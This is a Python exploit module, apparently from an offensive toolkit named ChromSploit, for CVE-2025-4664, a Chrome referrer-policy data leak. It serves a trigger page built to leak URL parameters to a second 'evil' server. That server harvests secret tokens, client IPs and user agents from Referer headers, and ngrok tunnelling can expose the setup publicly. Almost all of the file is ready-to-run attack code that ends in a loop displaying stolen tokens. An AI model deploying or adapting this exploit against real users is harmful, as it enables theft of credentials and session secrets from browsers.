#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2025-4664: Chrome Loader Cross-Origin Data Leak
Integrated exploit module for ChromSploit Framework
"""

import http.server
import socketserver
import threading
import time
import urllib.parse
from typing import Dict, Any, Optional
from dataclasses import dataclass

# ChromSploit imports
from core.enhanced_logger import get_logger
from core.colors import Colors
from core.config import Config
from core.utils import Utils

# Try to import framework utilities
try:
    from core.ngrok_utils import get_ngrok_url
    NGROK_AVAILABLE = True
except ImportError:
    NGROK_AVAILABLE = False

logger = get_logger()

@dataclass
class ExploitConfig:
    """Configuration for CVE-2025-4664 exploit"""
    listening_port: int = 8088
    evil_server_port: int = 8089
    target_sensitive_param: str = "secret_token"
    use_ngrok: bool = True


class ExploitServerHandler(http.server.SimpleHTTPRequestHandler):
    """Handler for the main exploit delivery server"""
    
    def __init__(self, *args, evil_server_url: str = None, sensitive_param: str = "secret_token", **kwargs):
        self.evil_server_url = evil_server_url
        self.sensitive_param = sensitive_param
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        """Override to use ChromSploit logger"""
        logger.debug(f"[CVE-2025-4664] {format % args}")
    
    def do_GET(self):
        logger.info(f"[CVE-2025-4664] Victim connected from {self.client_address[0]}")
        
        if self.path == "/trigger":
            self._serve_exploit_page()
        else:
            self._serve_404()
    
    def _serve_exploit_page(self):
        """Serve the exploit trigger page"""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        
        # Get evil server URL (ngrok or local)
        evil_url = self.evil_server_url or f"http://localhost:{self.server.server_port + 1}"
        
        # Craft the exploit page
        exploit_html = self._generate_exploit_html(evil_url)
        
        self.send_header("Content-Length", str(len(exploit_html)))
        self.end_headers()
        self.wfile.write(exploit_html.encode('utf-8'))
        
        logger.info(f"{Colors.GREEN}[+] Exploit page served to {self.client_address[0]}{Colors.RESET}")
    
    def _generate_exploit_html(self, evil_server_url: str) -> str:
        """Generate the HTML payload with Link header exploitation"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>CVE-2025-4664 - Chrome Data Leak PoC</title>
    <meta charset="utf-8">
    <!-- Critical: Link header with preconnect and unsafe-url referrerpolicy -->
    <link rel="preconnect" href="{evil_server_url}" referrerpolicy="unsafe-url">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .status {{ color: #333; margin: 20px 0; }}
        .warning {{ color: #d9534f; font-weight: bold; }}
    </style>
</head>
<body>
    <h1>ChromSploit - CVE-2025-4664 Demo</h1>
    <div class="status">
        <p>This page demonstrates the Chrome cross-origin data leak vulnerability.</p>
        <p>If you're using a vulnerable Chrome version, your URL parameters will be leaked.</p>
        <p class="warning">Current URL contains: {self.sensitive_param}=<span id="token">...</span></p>
    </div>
    
    <!-- Image request that will leak referrer to evil server -->
    <img src="{evil_server_url}/tracker.gif" width="1" height="1" alt="">
    
    <div id="result"></div>
    
    <script>
        // Extract and display current token
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('{self.sensitive_param}') || 'NO_TOKEN_PRESENT';
        document.getElementById('token').textContent = token;
        
        // Optional: Auto-redirect if no sensitive param present
        if (!urlParams.has('{self.sensitive_param}')) {{
            const newUrl = window.location.pathname + '?{self.sensitive_param}=DEMO_SECRET_TOKEN_' + 
                          Math.random().toString(36).substring(7).toUpperCase();
            setTimeout(() => {{
                document.getElementById('result').innerHTML = 
                    '<p>Redirecting to URL with sensitive parameter...</p>';
                window.location.href = newUrl;
            }}, 2000);
        }} else {{
            document.getElementById('result').innerHTML = 
                '<p style="color: #5cb85c;">Exploit triggered! Check the attacker server logs.</p>';
        }}
    </script>
</body>
</html>"""
    
    def _serve_404(self):
        """Serve 404 response"""
        self.send_response(404)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h1>404 - Not Found</h1>")


class EvilServerHandler(http.server.SimpleHTTPRequestHandler):
    """Handler for the evil server that collects leaked data"""
    
    def __init__(self, *args, sensitive_param: str = "secret_token", **kwargs):
        self.sensitive_param = sensitive_param
        self.leaked_data = []
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        """Override to use ChromSploit logger"""
        logger.debug(f"[CVE-2025-4664 EVIL] {format % args}")
    
    def do_GET(self):
        """Handle incoming requests and extract leaked referrer"""
        referer = self.headers.get('Referer', '')
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        logger.info(f"{Colors.CYAN}[CVE-2025-4664 EVIL] Request from {self.client_address[0]}{Colors.RESET}")
        logger.info(f"[CVE-2025-4664 EVIL] Path: {self.path}")
        
        if referer:
            logger.warning(f"{Colors.YELLOW}[CVE-2025-4664 EVIL] LEAKED REFERRER: {referer}{Colors.RESET}")
            
            # Check for sensitive data
            if self.sensitive_param in referer:
                # Extract the token value
                parsed_url = urllib.parse.urlparse(referer)
                params = urllib.parse.parse_qs(parsed_url.query)
                token_value = params.get(self.sensitive_param, [''])[0]
                
                logger.critical(f"{Colors.RED}[CVE-2025-4664 EVIL] !!! SENSITIVE DATA LEAKED !!!{Colors.RESET}")
                logger.critical(f"{Colors.RED}[CVE-2025-4664 EVIL] Parameter: {self.sensitive_param}={token_value}{Colors.RESET}")
                logger.critical(f"{Colors.RED}[CVE-2025-4664 EVIL] Full URL: {referer}{Colors.RESET}")
                
                # Store leaked data
                leak_info = {
                    'timestamp': time.time(),
                    'client_ip': self.client_address[0],
                    'referer': referer,
                    'token': token_value,
                    'user_agent': user_agent
                }
                self.server.leaked_data.append(leak_info)
        else:
            logger.info("[CVE-2025-4664 EVIL] No Referer header present")
        
        # Serve minimal response
        self._serve_tracker_response()
    
    def _serve_tracker_response(self):
        """Serve a minimal tracking pixel response"""
        self.send_response(200)
        self.send_header("Content-type", "image/gif")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        
        # 1x1 transparent GIF
        gif_data = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        self.wfile.write(gif_data)


class CVE2025_4664_Exploit:
    """CVE-2025-4664: Chrome Loader Cross-Origin Data Leak Exploit"""
    
    def __init__(self):
        self.name = "CVE-2025-4664"
        self.description = "Chrome Loader Cross-Origin Data Leak via Link Header and Referrer Policy"
        self.author = "ChromSploit Framework"
        self.cve_id = "CVE-2025-4664"
        self.requirements = [
            "Chrome < 136.0.7103.113 (Windows/Linux)",
            "Target must visit crafted page",
            "Network access to target"
        ]
        self.references = [
            "https://nvd.nist.gov/vuln/detail/CVE-2025-4664",
            "https://chromereleases.googleblog.com/2025/01/stable-channel-update-for-desktop.html"
        ]
        
        self.logger = get_logger()
        self.config = ExploitConfig()
        self.exploit_server = None
        self.evil_server = None
        self.leaked_data = []
        self._server_threads = []
    
    def check_vulnerable(self, target_info: Dict[str, Any]) -> bool:
        """Check if target is potentially vulnerable"""
        browser_name = target_info.get("browser_name", "").lower()
        browser_version = target_info.get("browser_version", "")
        
        if "chrome" not in browser_name:
            self.logger.info(f"[{self.name}] Target is not Chrome: {browser_name}")
            return False
        
        # Parse version for comparison
        try:
            if browser_version:
                version_parts = browser_version.split('.')
                major = int(version_parts[0])
                
                # Vulnerability affects versions before 136.0.7103.113
                if major < 136:
                    self.logger.info(f"{Colors.GREEN}[{self.name}] Target Chrome {browser_version} is vulnerable{Colors.RESET}")
                    return True
                elif major == 136:
                    # Need more detailed version check
                    self.logger.warning(f"{Colors.YELLOW}[{self.name}] Chrome 136.x detected - detailed version check needed{Colors.RESET}")
                    return True  # Assume vulnerable for PoC
        except Exception as e:
            self.logger.error(f"[{self.name}] Error parsing version: {e}")
        
        self.logger.info(f"[{self.name}] Target Chrome version {browser_version} may not be vulnerable")
        return False
    
    def generate_payload(self, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """Generate exploit payload configuration"""
        options = options or {}
        
        # Extract configuration from options
        self.config.listening_port = options.get('listening_port', self.config.listening_port)
        self.config.evil_server_port = options.get('evil_server_port', self.config.evil_server_port)
        self.config.target_sensitive_param = options.get('sensitive_param', self.config.target_sensitive_param)
        self.config.use_ngrok = options.get('use_ngrok', self.config.use_ngrok and NGROK_AVAILABLE)
        
        # Generate URLs
        if self.config.use_ngrok and NGROK_AVAILABLE:
            try:
                # Try to get ngrok URLs
                trigger_url = get_ngrok_url(self.config.listening_port, protocol='http')
                evil_url = get_ngrok_url(self.config.evil_server_port, protocol='http')
            except Exception as e:
                self.logger.warning(f"[{self.name}] Ngrok not available: {e}")
                trigger_url = f"http://localhost:{self.config.listening_port}/trigger"
                evil_url = f"http://localhost:{self.config.evil_server_port}"
        else:
            trigger_url = f"http://localhost:{self.config.listening_port}/trigger"
            evil_url = f"http://localhost:{self.config.evil_server_port}"
        
        # Add sensitive parameter to trigger URL
        trigger_url += f"?{self.config.target_sensitive_param}=DEMO_SECRET_VALUE"
        
        payload_details = {
            'trigger_url': trigger_url,
            'evil_server_url': evil_url,
            'description': f"Target visits trigger_url in vulnerable Chrome. The '{self.config.target_sensitive_param}' parameter will be leaked.",
            'listening_port': self.config.listening_port,
            'evil_server_port': self.config.evil_server_port,
            'sensitive_param': self.config.target_sensitive_param,
            'method': 'GET',
            'requirements': self.requirements
        }
        
        self.logger.info(f"{Colors.GREEN}[{self.name}] Payload generated successfully{Colors.RESET}")
        self.logger.debug(f"[{self.name}] Payload details: {payload_details}")
        
        return payload_details
    
    def execute(self, target: Dict[str, Any] = None, payload_options: Dict[str, Any] = None) -> Dict[str, Any]:
        """Execute the exploit"""
        self.logger.info(f"{Colors.CYAN}[{self.name}] Starting exploit execution...{Colors.RESET}")
        
        # Generate payload with options
        payload = self.generate_payload(payload_options)
        
        try:
            # Create custom handler classes with parameters
            evil_handler = lambda *args, **kwargs: EvilServerHandler(
                *args, 
                sensitive_param=self.config.target_sensitive_param,
                **kwargs
            )
            
            exploit_handler = lambda *args, **kwargs: ExploitServerHandler(
                *args,
                evil_server_url=payload['evil_server_url'],
                sensitive_param=self.config.target_sensitive_param,
                **kwargs
            )
            
            # Start evil server first
            self.evil_server = socketserver.TCPServer(
                ("", self.config.evil_server_port),
                evil_handler
            )
            self.evil_server.leaked_data = self.leaked_data  # Share data storage
            
            evil_thread = threading.Thread(
                target=self.evil_server.serve_forever,
                daemon=True,
                name=f"{self.name}_evil_server"
            )
            evil_thread.start()
            self._server_threads.append(evil_thread)
            
            self.logger.info(f"{Colors.GREEN}[{self.name}] Evil server started on port {self.config.evil_server_port}{Colors.RESET}")
            
            # Start exploit delivery server
            self.exploit_server = socketserver.TCPServer(
                ("", self.config.listening_port),
                exploit_handler
            )
            
            exploit_thread = threading.Thread(
                target=self.exploit_server.serve_forever,
                daemon=True,
                name=f"{self.name}_exploit_server"
            )
            exploit_thread.start()
            self._server_threads.append(exploit_thread)
            
            self.logger.info(f"{Colors.GREEN}[{self.name}] Exploit server started on port {self.config.listening_port}{Colors.RESET}")
            
            # Log exploitation instructions
            self.logger.critical(f"{Colors.BRIGHT_RED}{'='*60}{Colors.RESET}")
            self.logger.critical(f"{Colors.BRIGHT_RED}[{self.name}] EXPLOIT READY{Colors.RESET}")
            self.logger.critical(f"{Colors.BRIGHT_RED}{'='*60}{Colors.RESET}")
            self.logger.critical(f"{Colors.YELLOW}Target URL: {payload['trigger_url']}{Colors.RESET}")
            self.logger.critical(f"{Colors.YELLOW}Evil Server: {payload['evil_server_url']}{Colors.RESET}")
            self.logger.critical(f"{Colors.BRIGHT_RED}{'='*60}{Colors.RESET}")
            
            return {
                'status': 'success',
                'message': 'Exploit servers running',
                'details': payload,
                'servers_running': True,
                'leaked_data': self.leaked_data  # Reference to collect leaked data
            }
            
        except Exception as e:
            self.logger.error(f"{Colors.RED}[{self.name}] Execution failed: {e}{Colors.RESET}")
            self.cleanup()
            return {
                'status': 'error',
                'message': str(e),
                'details': None
            }
    
    def get_leaked_data(self) -> list:
        """Get any data that has been leaked so far"""
        return self.leaked_data
    
    def cleanup(self):
        """Stop servers and clean up resources"""
        self.logger.info(f"[{self.name}] Cleaning up...")
        
        # Shutdown servers
        if self.exploit_server:
            try:
                self.exploit_server.shutdown()
                self.exploit_server.server_close()
            except Exception as e:
                self.logger.error(f"[{self.name}] Error stopping exploit server: {e}")
        
        if self.evil_server:
            try:
                self.evil_server.shutdown()
                self.evil_server.server_close()
            except Exception as e:
                self.logger.error(f"[{self.name}] Error stopping evil server: {e}")
        
        # Wait for threads to finish
        for thread in self._server_threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self._server_threads.clear()
        self.logger.info(f"{Colors.GREEN}[{self.name}] Cleanup completed{Colors.RESET}")


# For framework module loading
def get_exploit():
    """Factory function for the module loader"""
    return CVE2025_4664_Exploit()


# Standalone testing
if __name__ == "__main__":
    # Initialize exploit
    exploit = CVE2025_4664_Exploit()
    
    # Test target
    target_info = {
        "browser_name": "Chrome",
        "browser_version": "135.0.0.0",
        "os": "Windows"
    }
    
    print(f"\n{Colors.CYAN}=== CVE-2025-4664 Standalone Test ==={Colors.RESET}")
    
    # Check vulnerability
    if exploit.check_vulnerable(target_info):
        print(f"{Colors.GREEN}[+] Target is vulnerable{Colors.RESET}")
        
        # Execute exploit
        result = exploit.execute(
            target=target_info,
            payload_options={
                'sensitive_param': 'api_key',
                'use_ngrok': False
            }
        )
        
        if result['status'] == 'success':
            print(f"{Colors.GREEN}[+] Exploit running successfully{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.RESET}")
            
            try:
                # Keep running and show leaked data
                while True:
                    time.sleep(5)
                    leaked = exploit.get_leaked_data()
                    if leaked:
                        print(f"\n{Colors.RED}[!] Leaked data collected: {len(leaked)} entries{Colors.RESET}")
                        for entry in leaked[-5:]:  # Show last 5
                            print(f"  - {entry['token']} from {entry['client_ip']}")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Stopping exploit...{Colors.RESET}")
                exploit.cleanup()
        else:
            print(f"{Colors.RED}[-] Exploit failed: {result['message']}{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}[-] Target not vulnerable{Colors.RESET}")